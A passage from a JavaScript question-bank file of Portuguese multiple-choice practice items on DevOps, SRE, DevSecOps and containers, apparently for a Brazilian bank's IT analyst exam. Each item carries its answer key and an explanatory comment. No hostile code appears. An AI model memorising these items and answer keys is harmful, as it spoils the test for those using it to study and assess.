    "A": "frequência de implantação e tempo de espera para mudanças (lead time).",
    "B": "frequência de implantação e taxa de falha de mudanças.",
    "C": "lead time para mudanças e tempo de restauração do serviço.",
    "D": "cobertura de testes e número de linhas de código.",
    "E": "taxa de falha de mudanças e tempo de restauração do serviço."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** **Taxa de falha de mudanças** e **tempo de restauração** (MTTR) medem estabilidade; **frequência de implantação** e **lead time** medem velocidade (throughput).\n\n(A) São as duas de velocidade. (B) e (C) Misturam uma de cada grupo. (D) Não são métricas DORA.\n\nRevisar: Apostila 06, §12.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V020",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um trimestre, uma equipe fez 40 implantações em produção. Dessas, 6 provocaram incidentes que exigiram rollback ou correção urgente. A taxa de falha de mudanças (change failure rate) da equipe no período foi de",
  "imagem": null,
  "alternativas": {
    "A": "6%.",
    "B": "13%.",
    "C": "15%.",
    "D": "34%.",
    "E": "85%."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Taxa de falha de mudanças = implantações com falha ÷ total de implantações = 6 ÷ 40 = 0,15 = **15%**.\n\n(A) Usa o número absoluto como percentual. (B) Divide 6 por 46 (soma indevida). (D) Subtrai 6 de 40 e trata como percentual. (E) É a taxa de **sucesso** (34 ÷ 40).\n\nConta conferida em `tools/verificacao/agente4/verif_devops.py`.\n\nRevisar: Apostila 06, §12.6.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V021",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um serviço de consulta de saldo tem SLO de disponibilidade de 99,9% medido em janelas de 30 dias. O orçamento de erros (error budget) do serviço, expresso em tempo de indisponibilidade tolerável na janela, é de aproximadamente",
  "imagem": null,
  "alternativas": {
    "A": "4,3 minutos.",
    "B": "43,2 minutos.",
    "C": "7,2 horas.",
    "D": "8,8 horas.",
    "E": "43,2 horas."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** Error budget = 100% − SLO = 0,1%. Em 30 dias há 30 × 24 × 60 = 43.200 minutos; 0,1% disso = **43,2 minutos**.\n\n(A) Corresponde a 99,99%. (C) Corresponde a 99%. (D) 8,8 horas ≈ 0,1% de um **ano** (8.760 h). (E) Erro de unidade (minutos tratados como horas).\n\nConta conferida em `tools/verificacao/agente4/verif_devops.py`.\n\nRevisar: Apostila 06, §12.6.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V022",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na terminologia de SRE, o percentual de requisições do Pix respondidas com sucesso em menos de 300 ms, efetivamente medido pelo monitoramento, a meta interna de que esse percentual seja de pelo menos 99,5% e o compromisso contratual com o cliente, com penalidade em caso de descumprimento, são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "SLA, SLO e SLI.",
    "B": "SLO, SLI e SLA.",
    "C": "SLI, SLA e SLO.",
    "D": "SLI, SLO e SLA.",
    "E": "SLA, SLI e SLO."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** **SLI** é o indicador medido; **SLO** é o objetivo interno para o SLI; **SLA** é o acordo contratual, com penalidades.\n\nAs demais alternativas trocam a ordem desses três conceitos.\n\nRevisar: Apostila 06, §12.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V023",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No fluxo de trabalho do Terraform, o comando que mostra as alterações que seriam feitas na infraestrutura, comparando a configuração com o estado registrado, sem aplicá-las, é",
  "imagem": null,
  "alternativas": {
    "A": "`terraform plan`.",
    "B": "`terraform init`.",
    "C": "`terraform apply`.",
    "D": "`terraform destroy`.",
    "E": "`terraform import`."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** `terraform plan` mostra o que vai mudar. O fluxo é `init` → `plan` → `apply`, e o Terraform guarda um **arquivo de estado** para saber o que já existe.\n\n(B) `init` prepara o diretório e baixa provedores. (C) `apply` executa as mudanças. (D) `destroy` remove os recursos. (E) `import` traz para o estado um recurso criado fora do Terraform.\n\nRevisar: Apostila 06, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V024",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Quanto ao modo de distribuição das configurações, ferramentas de gerência de configuração podem operar em push (um servidor de controle envia as configurações aos nós) ou em pull (agentes instalados nos nós buscam periodicamente a configuração). São exemplos, respectivamente, de push sem agente e de pull com agentes:",
  "imagem": null,
  "alternativas": {
    "A": "Puppet e Ansible.",
    "B": "Terraform e CloudFormation.",
    "C": "Ansible e Puppet.",
    "D": "Docker e Kubernetes.",
    "E": "Jenkins e SonarQube."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **Ansible** é push e agentless (via SSH); o **Puppet** (e o Chef) usa agentes que buscam a configuração (pull).\n\n(A) Inverte os modelos. (B) Terraform e CloudFormation são ferramentas de **provisionamento** declarativo, não de gerência de configuração por agentes. (D) São plataforma de contêineres e orquestrador. (E) São servidor de CI e ferramenta de qualidade de código.\n\nRevisar: Apostila 06, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V025",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma equipe passou a manter os manifestos do Kubernetes em um repositório Git, que é a fonte da verdade do estado desejado. Um agente no cluster compara continuamente o ambiente com o repositório e o sincroniza, revertendo alterações manuais. Essa prática é chamada de",
  "imagem": null,
  "alternativas": {
    "A": "GitOps, com ferramentas como Argo CD ou Flux.",
    "B": "Git Flow, com ramos de release.",
    "C": "infraestrutura mutável.",
    "D": "entrega contínua manual.",
    "E": "dark launch."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** No **GitOps**, o Git é a fonte da verdade e um agente (Argo CD, Flux) sincroniza o ambiente com o repositório.\n\n(B) Git Flow é estratégia de ramificação. (C) Infraestrutura mutável é alterar servidores no lugar, o oposto da reconciliação automática. (D) Não se trata de aprovação manual. (E) Dark launch espelha tráfego para uma nova versão.\n\nRevisar: Apostila 06, §12.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V026",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevSecOps: segurança no pipeline",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §19.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Durante o pipeline, uma ferramenta apontou que a aplicação usa uma versão de biblioteca de log com vulnerabilidade crítica conhecida (CVE), além de gerar a lista de componentes de terceiros da aplicação (SBOM). Essa verificação é feita por",
  "imagem": null,
  "alternativas": {
    "A": "SAST.",
    "B": "DAST.",
    "C": "RASP.",
    "D": "teste de carga.",
    "E": "SCA (Software Composition Analysis)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** A **SCA** identifica componentes de terceiros e suas versões, cruza com bases de vulnerabilidades (CVE) e licenças e gera **SBOM**.\n\n(A) SAST analisa o **código próprio** sem executar. (B) DAST ataca a aplicação em execução pelo lado de fora. (C) RASP protege a aplicação em produção, de dentro dela. (D) Teste de carga mede desempenho.\n\nRevisar: Apostila 04, §19.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V027",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevSecOps: segurança no pipeline",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §19.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma varredura de segredos no pipeline (por exemplo, com Gitleaks) detectou que uma chave de acesso ao banco de dados de produção foi commitada e enviada ao repositório remoto há duas semanas. A providência mais adequada é",
  "imagem": null,
  "alternativas": {
    "A": "apagar o arquivo no próximo commit, o que elimina a chave do histórico do Git.",
    "B": "tornar o repositório privado e manter a chave, já que só a equipe tem acesso.",
    "C": "adicionar o arquivo ao `.gitignore`, o que o remove dos clones existentes.",
    "D": "criptografar o arquivo com Base64 e commitar de novo.",
    "E": "revogar e trocar (rotacionar) a credencial imediatamente e passar a obtê-la de um cofre de segredos, como o HashiCorp Vault."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Um segredo exposto deve ser considerado **comprometido**: revoga-se e troca-se a credencial, e passa-se a usar **gestão de segredos** (Vault, Key Vault, Secrets Manager).\n\n(A) Um novo commit não apaga a chave do histórico. (B) Tornar privado não desfaz a exposição já ocorrida. (D) Base64 é codificação, não criptografia. (C) `.gitignore` só evita rastrear arquivos novos; não remove nada já versionado nem dos clones.\n\nRevisar: Apostila 04, §19.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V028",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevSecOps: segurança no pipeline",
  "ref_apostila": {
    "modulo": "04",
    "secao": "13",
    "titulo": "Virtualização e contêineres",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#13. Virtualização e contêineres]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §13.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "São boas práticas de segurança na construção e execução de imagens de contêiner, EXCETO:",
  "imagem": null,
  "alternativas": {
    "A": "usar imagens base mínimas e de origem confiável.",
    "B": "executar a aplicação com usuário não root, por meio da instrução USER.",
    "C": "varrer as imagens em busca de vulnerabilidades antes de publicá-las no registro.",
    "D": "usar multi-stage build para que ferramentas de compilação não fiquem na imagem final.",
    "E": "gravar senhas e chaves de API em instruções ENV do Dockerfile, para que fiquem disponíveis em qualquer ambiente."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Segredos em `ENV` (ou em qualquer camada) ficam gravados na imagem e podem ser lidos por quem tiver acesso a ela; devem vir de um gerenciador de segredos ou de Secrets do orquestrador em tempo de execução.\n\n(A), (B), (C) e (D) são boas práticas: imagem mínima e confiável, não rodar como root, varredura de imagens e multi-stage build.\n\nRevisar: Apostila 04, §13.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V029",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevSecOps: segurança no pipeline",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.6",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No contexto de DevSecOps, a expressão *shift left* significa",
  "imagem": null,
  "alternativas": {
    "A": "levar as atividades de segurança para o início do ciclo de desenvolvimento e automatizá-las no pipeline, desde requisitos e codificação.",
    "B": "deixar os testes de segurança para depois da implantação em produção.",
    "C": "transferir a responsabilidade pela segurança exclusivamente para a equipe de operações.",
    "D": "substituir testes automatizados por auditorias anuais.",
    "E": "deslocar as aplicações para a nuvem pública."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** *Shift left* é antecipar a segurança (e a qualidade) no ciclo: requisitos, modelagem de ameaças, SAST no commit, SCA no build, com segurança como responsabilidade compartilhada.\n\n(B) É o oposto. (C) DevSecOps torna a segurança responsabilidade de todos. (D) A ideia é automação contínua, não auditoria esporádica. (E) Não tem relação com migração para nuvem.\n\nRevisar: Apostila 06, §12.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V030",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Observabilidade: logs, métricas e traces",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §22.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma equipe quer acompanhar, em painel e com alerta, a quantidade de respostas HTTP 5xx por minuto e o percentil 95 da latência da API de cartões ao longo do tempo. Entre os três pilares da observabilidade, o mais adequado a essa necessidade é o de",
  "imagem": null,
  "alternativas": {
    "A": "logs, por registrarem eventos textuais detalhados.",
    "B": "métricas, por serem valores numéricos agregados ao longo do tempo.",
    "C": "traces, por mostrarem o caminho de uma requisição entre serviços.",
    "D": "dumps de memória.",
    "E": "auditorias de código."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **Métricas** são números ao longo do tempo (contadores, histogramas), ideais para painéis, tendências e alertas como taxa de 5xx e p95 de latência.\n\n(A) Logs registram eventos individuais; é possível derivar números deles, mas o pilar natural é o de métricas. (C) Traces mostram o percurso de uma requisição específica. (D) e (E) Não são pilares da observabilidade.\n\nRevisar: Apostila 04, §22.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V031",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Observabilidade: logs, métricas e traces",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §22.1",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Os quatro sinais de ouro (golden signals) do monitoramento propostos pelo SRE do Google são",
  "imagem": null,
  "alternativas": {
    "A": "confidencialidade, integridade, disponibilidade e autenticidade.",
    "B": "logs, métricas, traces e eventos.",
    "C": "latência, tráfego, erros e saturação.",
    "D": "CPU, memória, disco e rede.",
    "E": "frequência de implantação, lead time, taxa de falha e MTTR."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Os **quatro sinais de ouro** são **latência, tráfego, erros e saturação**.\n\n(A) São princípios de segurança. (B) Logs, métricas e traces são os pilares da observabilidade. (D) São recursos de infraestrutura (a saturação os considera, mas não são os sinais). (E) São as métricas DORA.\n\nRevisar: Apostila 04, §22.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V032",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Considere dois Dockerfiles para uma API Java construída com Maven:\n\n```dockerfile\n# Versão 1\nFROM maven:3.9-eclipse-temurin-21\nWORKDIR /app\nCOPY . .\nRUN mvn -B dependency:go-offline\nRUN mvn -B package\n```\n\n```dockerfile\n# Versão 2\nFROM maven:3.9-eclipse-temurin-21\nWORKDIR /app\nCOPY pom.xml .\nRUN mvn -B dependency:go-offline\nCOPY src ./src\nRUN mvn -B package\n```\n\nQuando apenas um arquivo em `src/` é alterado e a imagem é reconstruída, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "nas duas versões todas as camadas são reconstruídas, pois o Docker não usa cache entre builds.",
    "B": "na versão 1 o download das dependências é reaproveitado do cache, e na versão 2 não.",
    "C": "na versão 2 a camada que baixa as dependências é reaproveitada do cache, pois o `pom.xml` não mudou; na versão 1 ela é refeita.",
    "D": "as duas versões geram exatamente as mesmas camadas e o mesmo tempo de build.",
    "E": "a versão 2 é inválida, pois um Dockerfile só pode ter uma instrução COPY."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Cada instrução gera uma camada e o cache é invalidado a partir da primeira instrução cujo insumo mudou. Na versão 2, `COPY pom.xml` e o `RUN` de dependências não mudam e vêm do cache; só `COPY src` e o `package` são refeitos. Na versão 1, `COPY . .` muda com qualquer arquivo e invalida tudo depois dele, inclusive o download de dependências.\n\n(A) O Docker reaproveita camadas em cache. (B) Inverte as versões. (D) A ordem das instruções muda o aproveitamento do cache. (E) Podem existir várias instruções COPY.\n\nObs.: comportamento conferido na documentação do Docker (cache de build); não executado no container de verificação (sem daemon Docker).\n\nRevisar: Apostila 06, §12.5.",
  "tags": [
    "nao_executado"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V033",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "A técnica de Dockerfile que usa uma imagem com JDK e Maven para compilar a aplicação e copia apenas o `.jar` resultante para uma imagem final menor, só com o runtime, reduzindo tamanho e superfície de ataque, é o",
  "imagem": null,
  "alternativas": {
    "A": "Docker Compose.",
    "B": "HEALTHCHECK.",
    "C": "volume nomeado.",
    "D": "multi-stage build.",
    "E": "docker commit."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** No **multi-stage build** há vários `FROM` no mesmo Dockerfile; o estágio de build compila e o estágio final copia só o artefato (`COPY --from=...`).\n\n(A) Compose define aplicações multicontêiner. (C) Volume guarda dados persistentes. (B) HEALTHCHECK define como verificar a saúde do contêiner. (E) `docker commit` cria imagem a partir de um contêiner, prática pouco reprodutível.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V034",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "DevOps, CI/CD, IaC, contêineres e Git",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para que cada desenvolvedor suba localmente, com um só comando, a API de empréstimos, um PostgreSQL e um Redis, com redes e volumes definidos em um arquivo YAML, a ferramenta indicada é o",
  "imagem": null,
  "alternativas": {
    "A": "Docker Compose (`docker compose up`).",
    "B": "Kubernetes HPA.",
    "C": "Terraform.",
    "D": "Dockerfile multi-stage.",
    "E": "Jenkins."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **Docker Compose** define e executa aplicações com vários contêineres em um arquivo YAML (`compose.yaml`), subindo tudo com `docker compose up`.\n\n(B) HPA escala pods no Kubernetes. (C) Terraform provisiona infraestrutura. (D) Multi-stage build constrói **uma** imagem. (E) Jenkins é servidor de CI.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V035",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No Kubernetes, a menor unidade implantável, formada por um ou mais contêineres que compartilham o mesmo endereço IP e podem compartilhar volumes, é o",
  "imagem": null,
  "alternativas": {
    "A": "nó (node).",
    "B": "Deployment.",
    "C": "Service.",
    "D": "pod.",
    "E": "Namespace."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O **pod** é a menor unidade implantável; seus contêineres compartilham rede (mesmo IP) e armazenamento.\n\n(A) Nó é a máquina que executa pods. (B) Deployment gerencia réplicas e atualizações de pods. (C) Service dá endereço estável e balanceamento a um conjunto de pods. (E) Namespace é uma divisão lógica do cluster.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V036",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
